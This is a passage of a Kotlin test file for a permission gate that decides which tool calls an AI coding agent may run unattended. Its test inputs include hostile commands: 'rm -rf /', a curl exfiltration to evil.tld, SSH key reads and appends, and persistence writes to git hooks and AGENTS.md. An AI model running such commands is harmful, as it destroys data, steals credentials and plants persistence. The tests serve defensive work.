package dev.ccpocket.daemon.agent

import dev.ccpocket.daemon.approval.ApprovalCoordinator
import dev.ccpocket.daemon.bridge.BridgeGrant
import dev.ccpocket.protocol.AskWithdrawn
import dev.ccpocket.protocol.AskWithdrawnReason
import dev.ccpocket.protocol.Decision
import dev.ccpocket.protocol.Frame
import dev.ccpocket.protocol.PermissionAsk
import dev.ccpocket.protocol.PermissionMode
import dev.ccpocket.protocol.PermissionVerdict
import dev.ccpocket.protocol.PocketError
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking
import java.util.concurrent.CopyOnWriteArrayList
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertIs
import kotlin.test.assertTrue

/** The provider-neutral bridge: it translates a ControlRequest to a PermissionAsk and routes the verdict to
 *  the backend's [respond] callback. The wire format of that response is the backend's job (see ClaudeBackendTest). */
class PermissionBridgeTest {
    private data class Resp(val askId: String, val allow: Boolean, val remember: Boolean, val updated: String?, val deny: String?)

    @Test
    fun default_asks_then_allow_routes_to_respond() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) })

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "echo hi") }))
        val ask = emitted.single()
        assertIs<PermissionAsk>(ask)
        assertEquals("r1", ask.askId)
        assertEquals("Bash", ask.tool)

        coord.onVerdict(PermissionVerdict("c1", "r1", Decision.ALLOW, remember = true))
        val r = responses.single()
        assertEquals("r1", r.askId)
        assertTrue(r.allow)
        assertTrue(r.remember)
        scope.cancel()
    }

    @Test
    fun deny_routes_with_message() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) })

        b.onControlRequest(AgentEvent.ControlRequest("r2", "Bash", null))
        coord.onVerdict(PermissionVerdict("c1", "r2", Decision.DENY, message = "nope"))
        val r = responses.single()
        assertFalse(r.allow)
        assertEquals("nope", r.deny)
        scope.cancel()
    }

    @Test
    fun bypass_mode_allows_without_asking() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.BYPASS_PERMISSIONS, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) })

        b.onControlRequest(AgentEvent.ControlRequest("r3", "Bash", null))
        assertTrue(emitted.isEmpty())
        assertTrue(responses.single().allow)
        scope.cancel()
    }

    // ── OWNER BYPASS (issue #91): the configured owner's OWN turn runs unrestricted; nobody else's does ──

    @Test
    fun owner_bypass_still_obeys_the_bridge_destructive_command_wall() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, ownerBypassSession = true,
            bridgeGrant = { BridgeGrant.OWNER_BYPASS })
        // Owner identity skips ordinary asks, but an IM-origin prompt can still be injected: hard walls win.
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "rm -rf /") }))
        assertTrue(emitted.isEmpty(), "owner bypass must not push an ask")
        assertFalse(responses.single().allow, "owner bypass must never skip the deterministic destructive-command wall")
        scope.cancel()
    }

    @Test
    fun explicit_owner_authorization_runs_classifier_ask_bash_but_never_answers_human_decisions() = runBlocking {
        // #233 rules ①/②: the owner's dedicated session and an exact request the owner approved both
        // authorize the classifier's ASK middle for this turn. That authorization is not an answer to a plan
        // approval or AskUserQuestion, so both neverRemember tools must still reach the phone.
        suspend fun run(ownerBypass: Boolean, grant: BridgeGrant): Pair<List<Resp>, List<Frame>> {
            val scope = CoroutineScope(Dispatchers.Unconfined)
            val coord = ApprovalCoordinator(scope)
            val responses = mutableListOf<Resp>()
            val emitted = mutableListOf<Frame>()
            val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
                respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
                bridgeSession = true, ownerBypassSession = ownerBypass,
                bridgeGrant = { if (ownerBypass) BridgeGrant.OWNER_BYPASS else grant })

            b.onControlRequest(AgentEvent.ControlRequest("bash", "Bash", buildJsonObject { put("command", "python deploy.py --env staging") }))
            b.onControlRequest(AgentEvent.ControlRequest("plan", "ExitPlanMode", null))
            b.onControlRequest(AgentEvent.ControlRequest("question", "AskUserQuestion", null))

            scope.cancel()
            return responses to emitted
        }

        for ((label, ownerBypass, grant) in listOf(
            Triple("owner bypass", true, BridgeGrant.NONE),
            Triple("owner-approved request", false, BridgeGrant.OWNER_APPROVED),
        )) {
            val (responses, emitted) = run(ownerBypass, grant)
            assertEquals(listOf("bash"), responses.map { it.askId }, "$label must only auto-run Bash")
            assertTrue(responses.single().allow, "$label must run classifier-ASK Bash")
            assertEquals(
                setOf("plan", "question"),
                emitted.filterIsInstance<PermissionAsk>().map { it.askId }.toSet(),
                "$label must not answer neverRemember tools",
            )
        }
    }

    @Test
    fun mode_bypass_without_an_owner_decision_still_asks_for_ambiguous_bridge_bash() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.BYPASS_PERMISSIONS, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true)

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "python deploy.py") }))

        assertIs<PermissionAsk>(emitted.single(), "a mode switch carries no owner decision for this bridge request")
        assertTrue(responses.isEmpty())
        scope.cancel()
    }

    @Test
    fun owner_bypass_off_keeps_the_bridge_bash_gate_denying_for_everyone_else() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, ownerBypassSession = false) // the shared / group session (the default)
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "rm -rf /") }))
        assertTrue(emitted.isEmpty())
        assertFalse(responses.single().allow, "a non-owner's rm -rf / must stay denied by the bridge gate")
        scope.cancel()
    }

    @Test
    fun approved_bridge_request_is_full_access_only_while_its_turn_grant_is_active() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        var grant = BridgeGrant.OWNER_APPROVED
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true,
            bridgeGrant = { grant })

        // Full authorization skips ordinary piecemeal approval — ambiguous Bash included (#233 rule ②) —
        // but not either deterministic wall. Human-decision tools are covered by the dedicated test above.
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "python deploy.py") }))
        b.onControlRequest(AgentEvent.ControlRequest("r2", "Write", buildJsonObject { put("file_path", "notes.md") }))
        assertEquals(listOf(true, true), responses.map { it.allow })
        assertTrue(emitted.isEmpty())
        b.onControlRequest(AgentEvent.ControlRequest("rX", "Bash", buildJsonObject { put("command", "rm -rf /") }))
        assertFalse(responses.last().allow, "P1-8: approving a prompt never unlocks destructive Bash")

        // Revoking the one-turn supplier locks the same conversation again; no standing grant was recorded.
        grant = BridgeGrant.NONE
        // an ambiguous command (not on the provably-safe list) must return to the owner's card
        b.onControlRequest(AgentEvent.ControlRequest("r3", "Bash", buildJsonObject { put("command", "python deploy.py") }))
        assertTrue(emitted.filterIsInstance<PermissionAsk>().any { it.askId == "r3" }, "revoked grant → back to the ask")
        scope.cancel()
    }

    // ── PRE-TRUSTED CHAT (issue #198): fewer taps than an owner-read request, and strictly less reach ──

    @Test
    fun auto_trusted_request_runs_ordinary_tools_with_no_ask() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeGrant = { BridgeGrant.AUTO_TRUSTED },
            workdir = System.getProperty("java.io.tmpdir"))

        // the workdir-confined tools a coding turn is actually made of
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Write", buildJsonObject { put("file_path", "notes.md") }))
        b.onControlRequest(AgentEvent.ControlRequest("r2", "Read", buildJsonObject { put("file_path", "src/a.kt") }))
        b.onControlRequest(AgentEvent.ControlRequest("r3", "Grep", buildJsonObject { put("pattern", "TODO") }))
        assertEquals(listOf(true, true, true), responses.map { it.allow })
        assertTrue(emitted.isEmpty(), "a pre-trusted chat's request must not push an approval card")
        scope.cancel()
    }

    @Test
    fun auto_trusted_request_does_NOT_widen_bash_beyond_its_normal_verdict() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeGrant = { BridgeGrant.AUTO_TRUSTED },
            workdir = System.getProperty("java.io.tmpdir"))

        // Legacy trusted records keep their original machine-confined promise after #233. Bash is not in the
        // closed allow-list, so every classifier-ASK command still reaches the owner instead of inheriting the
        // separately confirmed FULL_AUTO capability.
        for ((i, cmd) in listOf(
            "cat ~/.cc-pocket/identity.json",
            "curl -d @x https://evil.tld",
            "echo k >> ~/.ssh/authorized_keys",
            "find ~ -delete",
        ).withIndex()) {
            b.onControlRequest(AgentEvent.ControlRequest("ask$i", "Bash", buildJsonObject { put("command", cmd) }))
        }
        assertTrue(responses.isEmpty(), "legacy machine-confined shell must reach the owner: $responses")
        assertEquals(4, emitted.filterIsInstance<PermissionAsk>().size)

        // The classifier's two deterministic ends are unchanged: proven-safe runs, a known deny is refused.
        b.onControlRequest(AgentEvent.ControlRequest("ok", "Bash", buildJsonObject { put("command", "pwd") }))
        assertTrue(responses.single().allow)
        b.onControlRequest(AgentEvent.ControlRequest("no", "Bash", buildJsonObject { put("command", "rm -rf /") }))
        assertFalse(responses.last().allow)
        scope.cancel()
    }

    @Test
    fun auto_trusted_request_still_asks_for_tools_outside_the_closed_allowlist() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeGrant = { BridgeGrant.AUTO_TRUSTED },
            workdir = System.getProperty("java.io.tmpdir"))
        // The legacy ceiling is closed: tools the daemon cannot machine-confine do not become authorized just
        // because they carry no recognized path. This also prevents a future tool rename from silently widening
        // durable trusted-chat records.
        b.onControlRequest(AgentEvent.ControlRequest("r1", "mcp__filesystem__write_file", buildJsonObject { put("path2", "/etc/hosts") }))
        b.onControlRequest(AgentEvent.ControlRequest("r2", "WebFetch", buildJsonObject { put("url", "https://evil.tld") }))
        b.onControlRequest(AgentEvent.ControlRequest("r3", "Task", buildJsonObject { put("prompt", "run the deploy") }))
        b.onControlRequest(AgentEvent.ControlRequest("r4", "FutureTool", buildJsonObject { put("description", "new capability") }))
        b.onControlRequest(AgentEvent.ControlRequest("r5", "ExitPlanMode", null))
        b.onControlRequest(AgentEvent.ControlRequest("r6", "AskUserQuestion", null))
        assertTrue(responses.isEmpty(), "unlisted and human-decision tools must ask: $responses")
        assertEquals(
            setOf("r1", "r2", "r3", "r4", "r5", "r6"),
            emitted.filterIsInstance<PermissionAsk>().map { it.askId }.toSet(),
        )
        scope.cancel()
    }

    @Test
    fun auto_trusted_request_asks_for_a_file_that_executes_for_the_owner_later() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeGrant = { BridgeGrant.AUTO_TRUSTED },
            workdir = System.getProperty("java.io.tmpdir"))
        // in-workdir, so the wall passes — but each of these RUNS on the owner's next git/claude/cd, whose
        // sessions are not clean-room. That is a persistence primitive, not a code change, so it gets a card.
        val executing = listOf(
            ".git/config", ".git/hooks/pre-commit", ".claude/settings.json", "sub/.envrc", ".mcp.json", ".claude.json",
            // agent instruction files + agent config dirs (§21.5 P1-4): loaded by the owner's next session
            "AGENTS.md", "CLAUDE.md", "CLAUDE.local.md", "sub/AGENTS.md", "agents.md", ".codex/config.toml", ".opencode/settings.json",
        )
        for ((i, p) in executing.withIndex()) {
            b.onControlRequest(AgentEvent.ControlRequest("x$i", "Write", buildJsonObject { put("file_path", p) }))
        }
        assertTrue(responses.isEmpty(), "an unattended write to an auto-executing file must ask: $responses")
        assertEquals(executing.size, emitted.size)
        // ...and a file that merely LOOKS like one is unaffected (segment match, not substring)
        b.onControlRequest(AgentEvent.ControlRequest("ok", "Write", buildJsonObject { put("file_path", "docs/dotgit-notes.md") }))
        assertTrue(responses.single().allow)
        scope.cancel()
    }

    @Test
    fun agent_instruction_files_and_config_dirs_ask_under_both_machine_confined_grants() = runBlocking {
        // §21.5 P1-4: AGENTS.md / CLAUDE.md / CLAUDE.local.md are loaded as standing instructions by the
        // owner's next agent session, and .codex / .opencode carry config that shapes it — same persistence
        // class as a git hook. One parameterized sweep over BOTH machine-confined grants (a shared set in
        // BridgeGrant, not two copies), over every write-shaped file tool, at root and in subdirectories,
        // including case variants (the macOS filesystem is case-insensitive, so `agents.MD` IS `AGENTS.md`).
        for (grant in listOf(BridgeGrant.AUTO_TRUSTED, BridgeGrant.REVIEWER_APPROVED)) {
            val scope = CoroutineScope(Dispatchers.Unconfined)
            val coord = ApprovalCoordinator(scope)
            val responses = mutableListOf<Resp>()
            val emitted = mutableListOf<Frame>()
            val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
                respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
                bridgeSession = true, bridgeGrant = { grant },
                workdir = System.getProperty("java.io.tmpdir"))

            val guarded = listOf(
                "AGENTS.md", "sub/AGENTS.md", "CLAUDE.md", "deep/nested/CLAUDE.md", "CLAUDE.local.md",
                "agents.md", "agents.MD", "Claude.Md", // case variants land on the same on-disk file
                ".codex/config.toml", ".codex/mcp.json", ".opencode/settings.json", ".opencode/plugin/x.js",
            )
            var n = 0
            for (tool in listOf("Write", "Edit", "MultiEdit")) {
                for (p in guarded) {
                    b.onControlRequest(AgentEvent.ControlRequest("g${n++}", tool, buildJsonObject { put("file_path", p) }))
                }
            }
            assertTrue(responses.isEmpty(), "$grant: instruction/config writes must reach the owner: $responses")
            assertEquals(3 * guarded.size, emitted.size, "$grant: each guarded write raises its own card")

            // Similar-LOOKING names stay ordinary project files: whole-name match, not substring — otherwise
            // the wall degrades into a nuisance filter and trusted chats lose their whole point.
            for ((i, p) in listOf("docs/agents-notes.md", "src/claude.md.backup", "AGENTS.md.bak").withIndex()) {
                b.onControlRequest(AgentEvent.ControlRequest("ok$i", "Write", buildJsonObject { put("file_path", p) }))
            }
            assertEquals(listOf(true, true, true), responses.map { it.allow }, "$grant: similar names must not be caught")
            scope.cancel()
        }
    }

    @Test
    fun machine_confined_grants_detect_persistence_through_an_in_workdir_symlink_alias() = runBlocking {
        for (grant in listOf(BridgeGrant.AUTO_TRUSTED, BridgeGrant.REVIEWER_APPROVED)) {
            val workdir = java.nio.file.Files.createTempDirectory("ccp-persistence-alias-")
            val scope = CoroutineScope(Dispatchers.Unconfined)
            try {
                java.nio.file.Files.createDirectories(workdir.resolve(".git/hooks"))
                // Relative and contained on purpose: `safe/hooks/pre-commit` looks ordinary lexically but its
                // canonical target is `.git/hooks/pre-commit`, so it must retain the persistence ask.
                java.nio.file.Files.createSymbolicLink(
                    workdir.resolve("safe"),
                    java.nio.file.Paths.get(".git"),
                )
                val coord = ApprovalCoordinator(scope)
                val responses = mutableListOf<Resp>()
                val emitted = mutableListOf<Frame>()
                val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
                    respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
                    bridgeSession = true,
                    bridgeGrant = { grant },
                    workdir = workdir.toFile().canonicalPath)

                // This is only a permission control request; no Write implementation is invoked by the test.
                b.onControlRequest(AgentEvent.ControlRequest(
                    "alias", "Write", buildJsonObject { put("file_path", "safe/hooks/pre-commit") },
                ))

                assertTrue(responses.isEmpty(), "$grant: a symlink alias must not bypass the persistence hold")
                assertEquals("alias", emitted.filterIsInstance<PermissionAsk>().single().askId)
            } finally {
                scope.cancel()
                // Delete the in-tree symlink itself before its target; the control request above created no file.
                java.nio.file.Files.deleteIfExists(workdir.resolve("safe"))
                java.nio.file.Files.deleteIfExists(workdir.resolve(".git/hooks"))
                java.nio.file.Files.deleteIfExists(workdir.resolve(".git"))
                java.nio.file.Files.deleteIfExists(workdir)
            }
        }
    }

    @Test
    fun auto_trusted_request_asks_when_the_daemon_could_not_resolve_a_target_at_all() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeGrant = { BridgeGrant.AUTO_TRUSTED },
            workdir = System.getProperty("java.io.tmpdir"))
        // no path key the daemon knows ⇒ the workdir wall passed VACUOUSLY, so "confined" is unproven and the
        // edit would land somewhere nobody saw (the codex fileChange-with-unknown-path shape)
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Edit", buildJsonObject { put("description", "tweak the config") }))
        assertTrue(responses.isEmpty(), "a file tool with no resolved target must ask")
        assertEquals(1, emitted.size)
        // Grep/Glob are exempt: an absent path legitimately means the session cwd
        b.onControlRequest(AgentEvent.ControlRequest("r2", "Grep", buildJsonObject { put("pattern", "TODO") }))
        assertTrue(responses.single().allow)
        scope.cancel()
    }

    @Test
    fun a_tilde_target_is_out_of_scope_rather_than_resolving_inside_the_workdir() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeGrant = { BridgeGrant.AUTO_TRUSTED },
            workdir = System.getProperty("java.io.tmpdir"))
        // `~` is not expanded by PathScope, so "~/.ssh/id_rsa" would resolve to <workdir>/~/.ssh/id_rsa and
        // land INSIDE the scope — while the execution side expands it to the real home dir (GuestGuard #152)
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Read", buildJsonObject { put("file_path", "~/.ssh/id_rsa") }))
        assertFalse(responses.single().allow, "a tilde target must be refused, not resolved into the workdir")
        assertTrue(emitted.isEmpty(), "and hard-denied, not offered as a card")
        scope.cancel()
    }

    @Test
    fun auto_trusted_request_still_hard_denies_a_file_outside_the_workdir() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeGrant = { BridgeGrant.AUTO_TRUSTED },
            workdir = System.getProperty("java.io.tmpdir"))
        val home = System.getProperty("user.home")
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Read", buildJsonObject { put("file_path", "$home/.ssh/id_rsa") }))
        assertFalse(responses.single().allow, "a trusted chat must not reach outside the bridge's project")
        assertTrue(emitted.isEmpty())
        scope.cancel()
    }

    @Test
    fun auto_trusted_request_still_routes_AskUserQuestion_to_a_human() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeGrant = { BridgeGrant.AUTO_TRUSTED })
        b.onControlRequest(AgentEvent.ControlRequest("q1", "AskUserQuestion", null))
        assertIs<PermissionAsk>(emitted.single())
        assertTrue(responses.isEmpty(), "the answer rides the verdict — auto-allowing it answers nothing")
        scope.cancel()
    }

    @Test
    fun owner_bypass_still_routes_AskUserQuestion_to_a_human() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, ownerBypassSession = true,
            bridgeGrant = { BridgeGrant.OWNER_BYPASS })
        // AskUserQuestion's ANSWER rides the verdict — auto-allowing it would answer nothing, so even under
        // owner bypass it must reach a human (neverRemember), exactly like user-chosen bypass mode.
        val input = kotlinx.serialization.json.Json.parseToJsonElement(
            """{"questions":[{"question":"Which?","header":"H","multiSelect":false,
                "options":[{"label":"A","description":"a"},{"label":"B","description":"b"}]}]}""",
        ) as kotlinx.serialization.json.JsonObject
        b.onControlRequest(AgentEvent.ControlRequest("r1", "AskUserQuestion", input))
        assertIs<PermissionAsk>(emitted.single())
        assertTrue(responses.isEmpty(), "the question must await a real answer, not auto-allow")
        scope.cancel()
    }

    @Test
    fun askUserQuestion_carries_questions_and_merges_answers_into_updatedInput() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) })

        val input = kotlinx.serialization.json.Json.parseToJsonElement(
            """{"questions":[{"question":"Which color?","header":"Color","multiSelect":false,
                "options":[{"label":"Red","description":"r"},{"label":"Blue","description":"b"}]}]}""",
        ) as kotlinx.serialization.json.JsonObject
        b.onControlRequest(AgentEvent.ControlRequest("q1", "AskUserQuestion", input))

        val ask = emitted.single()
        assertIs<PermissionAsk>(ask)
        assertEquals("Which color?", ask.questions?.single()?.question) // phone gets the structured card
        assertEquals(listOf("Red", "Blue"), ask.questions?.single()?.options?.map { it.label })

        coord.onVerdict(PermissionVerdict("c1", "q1", Decision.ALLOW, answers = mapOf("Which color?" to "Red")))
        val r = responses.single()
        assertTrue(r.allow)
        assertTrue(r.updated!!.contains(""""Which color?":"Red""""))  // answers merged into updatedInput
        assertTrue(r.updated!!.contains("questions"))                 // original input preserved
        scope.cancel()
    }

    @Test
    fun askUserQuestion_still_asks_under_bypass_and_ignores_remembered_rules() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        // a stale "always allow" for AskUserQuestion must not swallow questions either
        val rules = mutableSetOf("AskUserQuestion")
        val b = PermissionBridge("c1", PermissionMode.BYPASS_PERMISSIONS, coord, { emitted += it }, rules,
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) })

        b.onControlRequest(AgentEvent.ControlRequest("q2", "AskUserQuestion", null))
        assertEquals(1, emitted.size) // asked the phone despite bypass + remembered rule
        assertTrue(responses.isEmpty())
        scope.cancel()
    }

    @Test
    fun exitPlanMode_still_asks_under_bypass_and_ignores_remembered_rules() = runBlocking {
        // issue #156: the plan-approval gate is neverRemember — approving a plan is an explicit, per-plan
        // human decision, so bypassPermissions must NOT auto-approve it (and neither may a stale rule).
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val rules = mutableSetOf("ExitPlanMode")
        val b = PermissionBridge("c1", PermissionMode.BYPASS_PERMISSIONS, coord, { emitted += it }, rules,
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) })

        b.onControlRequest(AgentEvent.ControlRequest("p1", "ExitPlanMode", buildJsonObject { put("plan", "1. refactor\n2. test") }))
        val ask = emitted.single() // asked the phone despite bypass + remembered rule
        assertIs<PermissionAsk>(ask)
        assertEquals("p1", ask.askId)
        assertEquals("1. refactor\n2. test", ask.inputPreview) // the plan itself is what the user reviews
        assertTrue(ask.neverRemember)
        assertTrue(responses.isEmpty()) // nothing was auto-allowed
        scope.cancel()
    }

    @Test
    fun exit_plan_mode_snake_case_spelling_also_asks_under_bypass() = runBlocking {
        // #156 review follow-up: the CLI has emitted both spellings historically; ToolMeta maps them to the
        // same neverRemember meta, so both must survive bypass. Pins the snake_case leg explicitly.
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.BYPASS_PERMISSIONS, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) })

        b.onControlRequest(AgentEvent.ControlRequest("p2", "exit_plan_mode", buildJsonObject { put("plan", "step 1") }))
        val ask = emitted.single()
        assertIs<PermissionAsk>(ask)
        assertTrue(ask.neverRemember)
        assertTrue(responses.isEmpty())
        scope.cancel()
    }

    @Test
    fun resurfacePending_reemits_open_ask_only_until_answered() = runBlocking {
        // issue #55: a reattaching phone (backgrounded when the live PermissionAsk fired — plan mode surfaces the
        // AskUserQuestion minutes after a premature `result`) must be re-shown the still-open card, and NOT one it
        // already answered. resurfacePending re-emits exactly the open asks, to the reattaching sink only.
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) })

        val input = kotlinx.serialization.json.Json.parseToJsonElement(
            """{"questions":[{"question":"Which color?","header":"Color","multiSelect":false,
                "options":[{"label":"Red","description":"r"},{"label":"Blue","description":"b"}]}]}""",
        ) as kotlinx.serialization.json.JsonObject
        b.onControlRequest(AgentEvent.ControlRequest("q1", "AskUserQuestion", input))
        assertTrue(b.hasPending()) // reaper must spare a conversation blocked on this

        // reattach #1: the card is re-surfaced verbatim (same askId + structured questions) to the new sink
        val reattached = mutableListOf<Frame>()
        b.resurfacePending { reattached += it }
        val re = reattached.single()
        assertIs<PermissionAsk>(re)
        assertEquals("q1", re.askId)
        assertEquals("Which color?", re.questions?.single()?.question)

        // once answered it leaves [pending] — a later reattach must NOT re-show a card the user already handled
        coord.onVerdict(PermissionVerdict("c1", "q1", Decision.ALLOW, answers = mapOf("Which color?" to "Red")))
        assertFalse(b.hasPending())
        val reattachedAgain = mutableListOf<Frame>()
        b.resurfacePending { reattachedAgain += it }
        assertTrue(reattachedAgain.isEmpty())
        scope.cancel()
    }

    @Test
